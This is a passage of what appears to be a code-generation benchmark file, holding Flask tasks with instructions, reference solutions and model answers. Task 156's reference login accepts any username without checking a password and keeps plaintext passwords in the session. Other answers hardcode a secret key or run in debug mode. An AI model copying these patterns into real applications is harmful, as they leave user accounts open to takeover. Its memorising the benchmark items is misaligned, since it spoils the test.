request.get_json(silent=True)\n        if not pubsub_msg:\n            return jsonify(error=\"Invalid Content-Type or empty payload\"), 400\n        \n        is_valid, validation_error = validate_pubsub_message(pubsub_msg.get(\"message\", {}))\n        if not is_valid:\n            return jsonify(error=validation_error), 400\n        \n        processed_event = process_argocd_event(pubsub_msg[\"message\"])\n        store_in_bigquery(processed_event)\n\n        return \"\", 204\n    \n    except ValueError as ve:\n        return jsonify(error=str(ve)), 400\n    \n    except RuntimeError as re:\n        return jsonify(error=str(re)), 500\n    \n    except Exception as e:\n        return jsonify(error=f\"Internal server error: {str(e)}\"), 500\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=int(os.environ.get(\"PORT\", 8080)))"
  },
  {
    "Task_id": 156,
    "Instruction": "Task Description: Create a Flask-based web application class that handles user authentication, registration, and session management with role-based access control.\n\nClass Description: The WebApp class encapsulates a complete Flask web application with user authentication features. It includes database integration for user management, login/logout functionality, role-based access control, and session management.\n\nAttributes:\n\napp: [Flask] - The main Flask application instance\ndb: [SQLAlchemy] - Database instance for user management\nlogin_manager: [LoginManager] - Flask-Login manager for authentication\nUser: [SQLAlchemy Model] - Database model for user accounts\nSettingForm: [FlaskForm] - Form for password changes\nLoginForm: [FlaskForm] - Form for user login\nRegistrationForm: [FlaskForm] - Form for new user registration\nCaseForm: [FlaskForm] - Form for case management\n\nMethods:\n\n__init__: [None]() -> [None] - Initializes the Flask application, database, forms, and routes\nrun: [None](host='0.0.0.0', port=8080) -> [None] - Starts the Flask development server\nlogin_required: [function](role=\"ANY\") -> [function] - Decorator for role-based route protection\nload_user: [function](user_id) -> [User] - Callback for loading users from session\nunauthorized: [None]() -> [redirect] - Handler for unauthorized access attempts\nlogin: [function]() -> [response] - Handles user login requests\nsignup: [function]() -> [response] - Handles new user registration\nsetting: [function]() -> [response] - Handles user settings changes\nlogout: [function]() -> [redirect] - Handles user logout\nindex: [function]() -> [response] - Main application route",
    "Canonical_solution": "from flask import Flask, render_template, request, redirect, session\nfrom flask_login import UserMixin, LoginManager, login_user, logout_user, current_user\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField\nfrom wtforms.validators import ValidationError, DataRequired, EqualTo, Length\nimport os\nimport datetime\n\nclass WebApp:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.config[\"SESSION_COOKIE_SECURE\"] = False\n        self.app.config[\"SQLALCHEMY_TRACK_MODIFICATIONS\"] = False\n        self.app.config[\"SQLALCHEMY_DATABASE_URI\"] = \"sqlite:///logontracer.db\"\n        self.app.config[\"SECRET_KEY\"] = os.urandom(24)\n        self.app.permanent_session_lifetime = datetime.timedelta(minutes=60)\n        \n        self.db = SQLAlchemy(self.app)\n        self.login_manager = LoginManager()\n        self.login_manager.init_app(self.app)\n\n        class User(UserMixin, self.db.Model):\n            id = self.db.Column(self.db.Integer, primary_key=True)\n            username = self.db.Column(self.db.String(50), nullable=False, unique=True)\n            urole = self.db.Column(self.db.String(20))\n\n        class SettingForm(FlaskForm):\n            password1 = PasswordField('Password', validators=[DataRequired(), EqualTo('password2', message='Passwords must match.'), Length(min=3, max=20)])\n            password2 = PasswordField('Password (again)', validators=[DataRequired(), Length(min=3, max=20)])\n\n        class LoginForm(FlaskForm):\n            username = StringField('Username', validators=[DataRequired(), Length(min=3, max=50)])\n            password = PasswordField('Password', validators=[DataRequired(), Length(min=3, max=20)])\n\n        class RegistrationForm(FlaskForm):\n            username = StringField('Username', validators=[DataRequired(), Length(min=3, max=50)])\n            password1 = PasswordField('Password', validators=[DataRequired(), EqualTo('password2', message='Passwords must match.'), Length(min=3, max=20)])\n            password2 = PasswordField('Password (again)', validators=[DataRequired(), Length(min=3, max=20)])\n\n        class CaseForm(FlaskForm):\n            case = StringField('Case', validators=[DataRequired()])\n\n        with self.app.app_context():\n            self.db.create_all()\n\n        @self.login_manager.user_loader\n        def load_user(user_id):\n            return self.db.session.get(User, int(user_id))\n\n        @self.login_manager.unauthorized_handler\n        def unauthorized():\n            return redirect('/login')\n\n        @self.app.route('/login', methods=['GET', 'POST'])\n        def login():\n            if current_user.is_authenticated:\n                return redirect('/')\n\n            session.permanent = True\n            form = LoginForm(request.form)\n            if form.validate_on_submit():\n                username = form.username.data\n                password = form.password.data\n                remember = True if request.form.get(\"remember\") else False\n\n                session[\"username\"] = username\n                session[\"password\"] = password\n\n                user = User.query.filter_by(username=username).first()\n                login_user(user, remember=remember)\n                return redirect('/')\n\n            return render_template('login.html', form=form)\n\n        @self.app.route('/signup', methods=['GET', 'POST'])\n        @login_required(role=\"ADMIN\")\n        def signup():\n            form = RegistrationForm(request.form)\n            if form.validate_on_submit():\n                username = form.username.data\n                password = form.password1.data\n                admin = True if request.form.get(\"admin\") else False\n\n                with self.app.app_context():\n                    user = User(username=username, urole=\"ADMIN\" if admin else \"USER\")\n                    self.db.session.add(user)\n                    self.db.session.commit()\n\n                return redirect('/')\n            return render_template('signup.html', form=form)\n\n        @self.app.route('/setting', methods=['GET', 'POST'])\n        @login_required(role=\"ANY\")\n        def setting():\n            form = SettingForm(request.form)\n            if form.validate_on_submit():\n                username = current_user.username\n                password = form.password1.data\n\n                with self.app.app_context():\n                    user_query = User.query.filter_by(username=username).first()\n                    self.db.session.delete(user_query)\n                    self.db.session.commit()\n\n                    user = User(username=username, urole=user_query.urole)\n                    self.db.session.add(user)\n                    self.db.session.commit()\n\n                session[\"password\"] = password\n                return redirect('/')\n            return render_template('setting.html', form=form)\n\n        @self.app.route('/logout')\n        @login_required(role=\"ANY\")\n        def logout():\n            logout_user()\n            return redirect('/login')\n\n        @self.app.route('/')\n        @login_required(role=\"ANY\")\n        def index():\n            return render_template(\"index.html\")\n\n    def run(self, host='0.0.0.0', port=8080):\n        self.app.run(host=host, port=port)\n\n    def login_required(self, role=\"ANY\"):\n        def wrapper(fn):\n            @wraps(fn)\n            def decorated_view(*args, **kwargs):\n                if not current_user.is_authenticated:\n                    return self.login_manager.unauthorized()\n                urole = current_user.get_urole()\n                if ((urole != role) and (role != \"ANY\")):\n                    return self.login_manager.unauthorized()\n                return fn(*args, **kwargs)\n            return decorated_view\n        return wrapper",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, redirect, url_for, session, request\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_login import LoginManager, UserMixin, login_user, logout_user, login_required as lr, current_user\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField, SubmitField\nfrom wtforms.validators import DataRequired, EqualTo\n\nclass WebApp:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.config['SECRET_KEY'] = 'secret'\n        self.app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'\n        self.db = SQLAlchemy(self.app)\n        self.login_manager = LoginManager(self.app)\n        self.login_manager.login_view = 'login'\n        self.login_manager.unauthorized_handler(self.unauthorized)\n\n        class User(UserMixin, self.db.Model):\n            id = self.db.Column(self.db.Integer, primary_key=True)\n            username = self.db.Column(self.db.String(80), unique=True, nullable=False)\n            password = self.db.Column(self.db.String(120), nullable=False)\n            role = self.db.Column(self.db.String(80), nullable=False, default='user')\n\n        self.User = User\n\n        class SettingForm(FlaskForm):\n            old_password = PasswordField('Old Password', validators=[DataRequired()])\n            new_password = PasswordField('New Password', validators=[DataRequired()])\n            confirm = PasswordField('Confirm New Password', validators=[DataRequired(), EqualTo('new_password')])\n            submit = SubmitField('Change Password')\n\n        class LoginForm(FlaskForm):\n            username = StringField('Username', validators=[DataRequired()])\n            password = PasswordField('Password', validators=[DataRequired()])\n            submit = SubmitField('Login')\n\n        class RegistrationForm(FlaskForm):\n            username = StringField('Username', validators=[DataRequired()])\n            password = PasswordField('Password', validators=[DataRequired()])\n            confirm = PasswordField('Confirm Password', validators=[DataRequired(), EqualTo('password')])\n            submit = SubmitField('Register')\n\n        class CaseForm(FlaskForm):\n            case_name = StringField('Case Name', validators=[DataRequired()])\n            submit = SubmitField('Create Case')\n\n        self.SettingForm = SettingForm\n        self.LoginForm = LoginForm\n        self.RegistrationForm = RegistrationForm\n        self.CaseForm = CaseForm\n\n        @self.app.route('/')\n        @lr()\n        def index():\n            return render_template('index.html')\n\n        @self.app.route('/login', methods=['GET', 'POST'])\n        def login():\n            form = self.LoginForm()\n            if form.validate_on_submit():\n                user = self.User.query.filter_by(username=form.username.data).first()\n                if user and user.password == form.password.data:\n                    login_user(user)\n                    return redirect(url_for('index'))\n            return render_template('login.html', form=form)\n\n        @self.app.route('/signup', methods=['GET', 'POST'])\n        def signup():\n            form = self.RegistrationForm()\n            if form.validate_on_submit():\n                user = self.User(username=form.username.data, password=form.password.data, role='user')\n                self.db.session.add(user)\n                self.db.session.commit()\n                return redirect(url_for('login'))\n            return render_template('register.html', form=form)\n\n        @self.app.route('/setting', methods=['GET', 'POST'])\n        @lr()\n        def setting():\n            form = self.SettingForm()\n            if form.validate_on_submit():\n                if current_user.password == form.old_password.data:\n                    current_user.password = form.new_password.data\n                    self.db.session.commit()\n                    return redirect(url_for('index'))\n            return render_template('settings.html', form=form)\n\n        @self.app.route('/logout')\n        def logout():\n            logout_user()\n            return redirect(url_for('login'))\n\n    def run(self, host='0.0.0.0', port=8080):\n        with self.app.app_context():\n            self.db.create_all()\n        self.app.run(host=host, port=port)\n\n    def login_required(self, role=\"ANY\"):\n        def wrapper(fn):\n            @login_required\n            def decorated_view(*args, **kwargs):\n                if current_user.role != role and role != \"ANY\":\n                    return redirect(url_for('unauthorized'))\n                return fn(*args, **kwargs)\n            return decorated_view\n        return wrapper\n\n    def unauthorized(self):\n        return redirect(url_for('login'))"
  },
  {
    "Task_id": 157,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that receives JSON data, processes it using a pre-trained machine learning model, and returns predictions in JSON format.\n\nFunction Description: The function handles POST requests to the '/predict' endpoint. It receives JSON data, validates it, loads a pre-trained model, makes predictions, and returns the results. It also includes error handling for bad requests.\n\nInput: \n- HTTP POST request with JSON payload containing data for prediction\n- The function accesses this through Flask's request.get_json()\n\nOutput:\n- Successful case: JSON response containing prediction results with HTTP status code 200\n- Error case: JSON error message with HTTP status code 400 for bad requests",
    "Canonical_solution": "from flask import Flask, jsonify, request\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef apicall():\n    try:\n        test_json = request.get_json()\n        test = pd.read_json(test_json)\n        print(\"The test data received are as follows...\")\n        print(test)\n        print()\n\n    except Exception as e:\n        raise e\n\n    clf = 'lm_model_v1.pk'\n    \n    if test.empty:\n        return(bad_request())\n    else:\n        print(\"Loading the model...\")\n        loaded_model = None\n        with open('./models/'+clf,'rb') as f:\n            loaded_model = pickle.load(f)\n\n        print(\"The model has been loaded...doing predictions now...\")\n        print()\n        predictions = loaded_model.predict(test)\n            \n        prediction_series = pd.Series(predictions)\n        response = jsonify(prediction_series.to_json())\n        response.status_code = 200\n        return (response)\n\n@app.errorhandler(400)\ndef bad_request(error=None):\n    message = {\n            'status': 400,\n            'message': 'Bad Request: ' + request.url + '--> Please check your data payload...',\n    }\n    resp = jsonify(message)\n    resp.status_code = 400\n\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport joblib\nimport numpy as np\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    try:\n        data = request.get_json(force=True)\n        if not data or 'features' not in data:\n            return jsonify(error=\"Missing 'features' in request\"), 400\n        \n        features = np.array(data['features']).reshape(1, -1)\n        \n        model = joblib.load('pretrained_model.pkl')\n        prediction = model.predict(features).tolist()\n        \n        return jsonify(prediction=prediction), 200\n    \n    except Exception as e:\n        return jsonify(error=str(e)), 400\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 158,
    "Instruction": "Task Description: Create a Flask-based web application for movie recommendations that handles user requests, processes movie data, and returns recommendations along with detailed movie information.\n\nFunction Description: The application consists of three main routes that handle different aspects of movie recommendations: displaying the home page with suggestions, finding similar movies based on user input, and providing detailed recommendations for a selected movie.\n\nInput:\n- For \"/\" and \"/home\" routes: None (GET requests)\n- For \"/similarity\" route: A POST request with form data containing 'name' (movie title)\n- For \"/recommend\" route: A POST request with form data containing multiple movie attributes (title, cast info, IMDB ID, etc.)\n\nOutput:\n- For \"/\" and \"/home\" routes: Rendered HTML template 'home.html' with movie suggestions\n- For \"/similarity\" route: Either an error string or a string of recommended movies joined by \"---\"\n- For \"/recommend\" route: Rendered HTML template 'recommend.html' with comprehensive movie details, recommendations, and reviews\n\nMethods:\n1. home() -> HTML - Displays the home page with movie suggestions\n2. similarity() -> str - Returns similar movies based on user input\n3. recommend() -> HTML - Provides detailed recommendations for a selected movie",
    "Canonical_solution": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route(\"/\")\n@app.route(\"/home\")\ndef home():\n    suggestions = get_suggestions()\n    return render_template('home.html',suggestions=suggestions)\n\n@app.route(\"/similarity\",methods=[\"POST\"])\ndef similarity():\n    movie = request.form['name']\n    rc = rcmd(movie)\n    if type(rc)==type('string'):\n        return rc\n    else:\n        m_str=\"---\".join(rc)\n        return m_str\n\n@app.route(\"/recommend\",methods=[\"POST\"])\ndef recommend():\n    title = request.form['title']\n    cast_ids = request.form['cast_ids']\n    cast_names = request.form['cast_names']\n    cast_chars = request.form['cast_chars']\n    cast_bdays = request.form['cast_bdays']\n    cast_bios = request.form['cast_bios']\n    cast_places = request.form['cast_places']\n    cast_profiles = request.form['cast_profiles']\n    imdb_id = request.form['imdb_id']\n    poster = request.form['poster']\n    genres = request.form['genres']\n    overview = request.form['overview']\n    vote_average = request.form['rating']\n    vote_count = request.form['vote_count']\n    release_date = request.form['release_date']\n    runtime = request.form['runtime']\n    status = request.form['status']\n    rec_movies = request.form['rec_movies']\n    rec_posters = request.form['rec_posters']\n\n    suggestions = get_suggestions()\n\n    rec_movies = convert_to_list(rec_movies)\n    rec_posters = convert_to_list(rec_posters)\n    cast_names = convert_to_list(cast_names)\n    cast_chars = convert_to_list(cast_chars)\n    cast_profiles = convert_to_list(cast_profiles)\n    cast_bdays = convert_to_list(cast_bdays)\n    cast_bios = convert_to_list(cast_bios)\n    cast_places = convert_to_list(cast_places)\n    \n    cast_ids = cast_ids.split(',')\n    cast_ids[0] = cast_ids[0].replace(\"[\",\"\")\n    cast_ids[-1] = cast_ids[-1].replace(\"]\",\"\")\n    \n    for i in range(len(cast_bios)):\n        cast_bios[i] = cast_bios[i].replace(r'\\n', '\\n').replace(r'\\\"','\\\"')\n    \n    movie_cards = {rec_posters[i]: rec_movies[i] for i in range(len(rec_posters))}\n    \n    casts = {cast_names[i]:[cast_ids[i], cast_chars[i], cast_profiles[i]] for i in range(len(cast_profiles))}\n\n    cast_details = {cast_names[i]:[cast_ids[i], cast_profiles[i], cast_bdays[i], cast_places[i], cast_bios[i]] for i in range(len(cast_places))}\n\n    sauce = urllib.request.urlopen('https://www.imdb.com/title/{}/reviews?ref_=tt_ov_rt'.format(imdb_id)).read()\n    soup = bs.BeautifulSoup(sauce,'lxml')\n    soup_result = soup.find_all(\"div\",{\"class\":\"text show-more__control\"})\n\n    reviews_list = []\n    reviews_status = []\n    for reviews in soup_result:\n        if reviews.string:\n            reviews_list.append(reviews.string)\n            movie_review_list = np.array([reviews.string])\n            movie_vector = vectorizer.transform(movie_review_list)\n            pred = clf.predict(movie_vector)\n            reviews_status.append('Good' if pred else 'Bad')\n\n    movie_reviews = {reviews_list[i]: reviews_status[i] for i in range(len(reviews_list))}     \n\n    return render_template('recommend.html',title=title,poster=poster,overview=overview,vote_average=vote_average,\n        vote_count=vote_count,release_date=release_date,runtime=runtime,status=status,genres=genres,\n        movie_cards=movie_cards,reviews=movie_reviews,casts=casts,cast_details=cast_details)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, request, jsonify\nimport pandas as pd\nimport numpy as np\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nimport difflib\n\napp = Flask(__name__)\n\n# Load movie data\nmovies_data = pd.read_csv('movies.csv')\nselected_features = ['genres', 'keywords', 'tagline', 'cast', 'director']\nfor feature in selected_features:\n    movies_data[feature] = movies_data[feature].fillna('')\n\ncombined_features = movies_data['genres'] + ' ' + movies_data['keywords'] + ' ' + movies_data['tagline'] + ' ' + movies_data['cast'] + ' ' + movies_data['director']\nvectorizer = TfidfVectorizer()\nfeature_vectors = vectorizer.fit_transform(combined_features)\n\n@app.route('/')\n@app.route('/home')\ndef home():\n    popular_movies = movies_data.head(10)['title'].tolist()\n    return render_template('home.html', suggestions=popular_movies)\n\n@app.route('/similarity', methods=['POST'])\ndef similarity():\n    movie_name = request.form.get('name', '').strip()\n    if not movie_name:\n        return \"Please enter a movie title.\"\n    \n    list_of_all_titles = movies_data['title'].tolist()\n    find_close_match = difflib.get_close_matches(movie_name, list_of_all_titles, n=1, cutoff=0.5)\n    \n    if not find_close_match:\n        return \"Movie not found in database. Please try another title.\"\n    \n    close_match = find_close_match[0]\n    index_of_movie = movies_data[movies_data.title == close_match].index[0]\n    \n    similarity_scores = cosine_similarity(feature_vectors[index_of_movie], feature_vectors)\n    similarity_list = list(enumerate(similarity_scores[0]))\n    sorted_similar_movies = sorted(similarity_list, key=lambda x: x[1], reverse=True)[1:11]\n    \n    recommended_movies = [movies_data.iloc[i[0]].title for i in sorted_similar_movies]\n    return \"---\".join(recommended_movies)\n\n@app.route('/recommend', methods=['POST'])\ndef recommend():\n    title = request.form.get('movie_title', '')\n    cast = request.form.get('cast', '')\n    imdb_id = request.form.get('imdb_id', '')\n    \n    if not title:\n        return render_template('recommend.html', error=\"No movie title provided.\")\n        \n    list_of_all_titles = movies_data['title'].tolist()\n    find_close_match = difflib.get_close_matches(title, list_of_all_titles, n=1, cutoff=0.5)\n    \n    if not find_close_match:\n        return render_template('recommend.html', error=\"Movie not found in database.\")\n    \n    close_match = find_close_match[0]\n    movie_info = movies_data[movies_data.title == close_match].iloc[0]\n    \n    # Generate recommendations based on similarity\n    index_of_movie = movies_data[movies_data.title == close_match].index[0]\n    similarity_scores = cosine_similarity(feature_vectors[index_of_movie], feature_vectors)\n    similarity_list = list(enumerate(similarity_scores[0]))\n    sorted_similar_movies = sorted(similarity_list, key=lambda x: x[1], reverse=True)[1:6]\n    \n    recommended_movies = []\n    for i in sorted_similar_movies:\n        movie = movies_data.iloc[i[0]]\n        recommended_movies.append({\n            'title': movie.title,\n            'score': round(i[1] * 100, 2),\n            'genres': movie.genres.split('|') if '|' in str(movie.genres) else [movie.genres],\n            'rating': np.random.uniform(7.0, 9.5).round(1)\n        })\n    \n    # Mock reviews (would come from a database or API in a real app)\n    reviews = [\n        f\"Great movie with amazing {cast} performance!\" if cast else \"Enjoyed this movie thoroughly.\",\n        \"Would definitely watch it again.\",\n        \"A must-watch for all movie lovers.\"\n    ]\n    \n    return render_template('recommend.html', \n                          movie=movie_info,\n                          recommendations=recommended_movies,\n                          reviews=reviews,\n                          imdb_id=imdb_id)\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 159,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles image processing and video generation requests, including live preview streaming and final video download capabilities.\n\nFunction Description: The code implements a Flask web server with four main endpoints:\n1. Serves a static HTML interface\n2. Accepts image uploads for processing\n3. Provides a live MJPEG stream of processed frames\n4. Generates and returns a final processed video file\n\nInput:\n- HTTP GET/POST requests to defined endpoints\n- Image data as base64-encoded strings via POST\n- Configuration parameters for image processing\n\nOutput:\n- Static HTML page for the interface\n- Live MJPEG stream of processed frames\n- Processed MP4 video file for download\n- Empty responses for successful operations\n\nMethods:\n\nindex() -> flask.Response - Serves the static HTML interface file\n- Input: None\n- Output: Static HTML file response\n\nload_image() -> str - Processes uploaded image data\n- Input: \n  - strFile: Filename string\n  - strData: Base64-encoded image data\n- Output: Empty string response\n\nget_live() -> flask.Response - Generates MJPEG live stream\n- Input: None\n- Output: Multipart MJPEG stream response\n\nget_result() -> flask.Response - Generates and returns processed video\n- Input: None\n- Output: MP4 video file attachment\n\nNote: The implementation uses gevent for asynchronous handling and includes image processing utilities (process_load, process_inpaint, process_kenburns) which are assumed to be defined elsewhere. The server runs on port 8080 and serves static files from the current directory.",
    "Canonical_solution": "import flask\nimport gevent\nimport gevent.pywsgi\nimport os\nimport time\nimport tempfile\nimport random\nimport numpy\nimport cv2\nimport base64\nimport io\nimport shutil\nimport moviepy\n\nobjFlask = flask.Flask(import_name=__name__, static_url_path='', static_folder=os.path.abspath('./'))\nobjFlask.json.sort_keys = False\n\n@objFlask.route(rule='/', methods=[ 'GET' ])\ndef index():\n\treturn objFlask.send_static_file('interface.html')\n\n@objFlask.route(rule='/load_image', methods=[ 'POST' ])\ndef load_image():\n\tobjPlayback['strImage'] = flask.request.form['strFile']\n\tobjPlayback['npyImage'] = numpy.ascontiguousarray(cv2.imdecode(buf=numpy.frombuffer(base64.b64decode(flask.request.form['strData'].split(';base64,')[1]), numpy.uint8), flags=-1)[:, :, 0:3])\n\tobjPlayback['strCache'] = {}\n\n\tprocess_load(objPlayback['npyImage'], {})\n\n\tfor fltX, fltY in [ (100.0, 0.0), (-100.0, 0.0), (0.0, 100.0), (0.0, -100.0) ]:\n\t\tprocess_inpaint(torch.tensor(data=[[[fltX], [fltY], [0.0]]], dtype=torch.float32, device=torch.device('cuda')))\n\t# end\n\n\treturn ''\n\n@objFlask.route(rule='/get_live', methods=[ 'GET' ])\ndef get_live():\n\tdef generator():\n\t\tfltFramelimiter = 0.0\n\n\t\twhile True:\n\t\t\tfor intYield in range(100): gevent.sleep(0.0)\n\n\t\t\tgevent.sleep(max(0.0, (1.0 / 25.0) - (time.time() - fltFramelimiter))); fltFramelimiter = time.time()\n\n\t\t\tif objPlayback['strImage'] is None:\n\t\t\t\tyield b'--frame\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n' + cv2.imencode(ext='.jpg', img=numpy.ones([ 768, 1024, 3 ], numpy.uint8) * 29, params=[ cv2.IMWRITE_JPEG_QUALITY, 80 ])[1].tobytes() + b'\\r\\n'; continue\n\t\t\t# end\n\n\t\t\tif objPlayback['intTime'] > len(objPlayback['fltTime']) - 1:\n\t\t\t\tobjPlayback['intTime'] = 0\n\t\t\t# end\n\n\t\t\tintTime = objPlayback['intTime']\n\t\t\tfltTime = objPlayback['fltTime'][intTime]\n\n\t\t\tif objPlayback['strMode'] == 'automatic':\n\t\t\t\tobjPlayback['intTime'] += 1\n\t\t\t# end\n\n\t\t\tif str(fltTime) not in objPlayback['strCache']:\n\t\t\t\tnpyKenburns = process_kenburns({\n\t\t\t\t\t'fltSteps': [ fltTime ],\n\t\t\t\t\t'objFrom': objPlayback['objFrom'],\n\t\t\t\t\t'objTo': objPlayback['objTo'],\n\t\t\t\t\t'boolInpaint': False\n\t\t\t\t})[0]\n\n\t\t\t\tobjPlayback['strCache'][str(fltTime)] = b'--frame\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n' + cv2.imencode(ext='.jpg', img=npyKenburns, params=[ cv2.IMWRITE_JPEG_QUALITY, 80 ])[1].tobytes() + b'\\r\\n'\n\t\t\t# end\n\n\t\t\tyield objPlayback['strCache'][str(fltTime)]\n\t\t# end\n\t# end\n\n\treturn flask.Response(response=generator(), mimetype='multipart/x-mixed-replace; boundary=frame')\n\n@objFlask.route(rule='/get_result', methods=[ 'GET' ])\ndef get_result():\n\tstrTempdir = tempfile.gettempdir() + '/kenburns-' + format(time.time(), '.6f') + '-' + str(os.getpid()) + '-' + str().join([random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for intCount in range(8)])\n\n\tos.makedirs(name=strTempdir + '/', exist_ok=False)\n\n\tnpyKenburns = process_kenburns({\n\t\t'fltSteps': numpy.linspace(0.0, 1.0, 75).tolist(),\n\t\t'objFrom': objPlayback['objFrom'],\n\t\t'objTo': objPlayback['objTo'],\n\t\t'boolInpaint': True\n\t})\n\n\tmoviepy.ImageSequenceClip(sequence=[ npyFrame[:, :, ::-1] for npyFrame in npyKenburns + list(reversed(npyKenburns))[1:-1] ], fps=25).write_videofile(strTempdir + '/kenburns.mp4')\n\n\tobjKenburns = io.BytesIO(open(strTempdir + '/kenburns.mp4', 'rb').read())\n\n\tshutil.rmtree(strTempdir + '/')\n\n\treturn flask.send_file(filename_or_fp=objKenburns, mimetype='video/mp4', as_attachment=True, attachment_filename='kenburns.mp4', cache_timeout=-1)\n\nif __name__ == '__main__':\n\tgevent.pywsgi.WSGIServer(listener=('0.0.0.0', 8080), application=objFlask).serve_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Response, request, send_from_directory\nfrom gevent.pywsgi import WSGIServer\nimport base64\nimport os\nimport cv2\nimport numpy as np\n\napp = Flask(__name__)\napp.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0\n\n# Assume these functions are defined elsewhere\ndef process_load(img): pass\ndef process_inpaint(img): return img\ndef process_kenburns(img): return img\n\n# Global variables for frame handling\ncurrent_frame = None\nprocessed_frames = []\n\n@app.route('/')\ndef index():\n    return send_from_directory('.', 'index.html')\n\n@app.route('/load', methods=['POST'])\ndef load_image():\n    global current_frame, processed_frames\n    data = request.get_json()\n    strFile = data['filename']\n    strData = data['data']\n    \n    # Decode base64 image data\n    header, encoded = strData.split(\",\", 1)\n    img_data = base64.b64decode(encoded)\n    img = cv2.imdecode(np.frombuffer(img_data, dtype=np.uint8), -1)\n    \n    # Process image through pipeline\n    process_load(img)\n    img = process_inpaint(img)\n    img = process_kenburns(img)\n    \n    # Store frames for streaming and final video\n    current_frame = img.copy()\n    processed_frames.append(img.copy())\n    \n    return ''\n\ndef generate_live_stream():\n    while True:\n        if current_frame is not None:\n            ret, jpeg = cv2.imencode('.jpg', current_frame)\n            if ret:\n                yield (b'--frame\\r\\n'\n                       b'Content-Type: image/jpeg\\r\\n\\r\\n' + jpeg.tobytes() + b'\\r\\n')\n                \n@app.route('/live')\ndef get_live():\n    return Response(generate_live_stream(),\n                    mimetype='multipart/x-mixed-replace; boundary=frame')\n\n@app.route('/result')\ndef get_result():\n    global processed_frames\n    if not processed_frames:\n        return ''\n    \n    # Create video from processed frames\n    height, width, _ = processed_frames[0].shape\n    fourcc = cv2.VideoWriter_fourcc(*'mp4v')\n    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (width, height))\n    \n    for frame in processed_frames:\n        out.write(frame)\n    \n    out.release()\n    \n    # Clear frames after video generation\n    processed_frames = []\n    \n    return send_from_directory('.', 'output.mp4', as_attachment=True)\n\nif __name__ == '__main__':\n    http_server = WSGIServer(('0.0.0.0', 8080), app)\n    print(\"Server running on port 8080...\")\n    http_server.serve_forever()"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a server, handling connection creation, request sending, and response retrieval with support for retries, timeouts, and connection reuse.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP/HTTPS connections that provides efficient connection reuse and handles various network-related exceptions. It supports configurable timeouts, retries, and proxy settings.\n\nAttributes:\n- scheme: str - The URL scheme (http/https) for connections\n- host: str - The target server hostname\n- port: int - The target server port (optional)\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse - Sends an HTTP request through the given connection and returns the response\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse - Main method to open a URL with retry and timeout handling, managing connection lifecycle",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n)\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n\n        except (BrokenPipeError, IOError) as e:\n            if 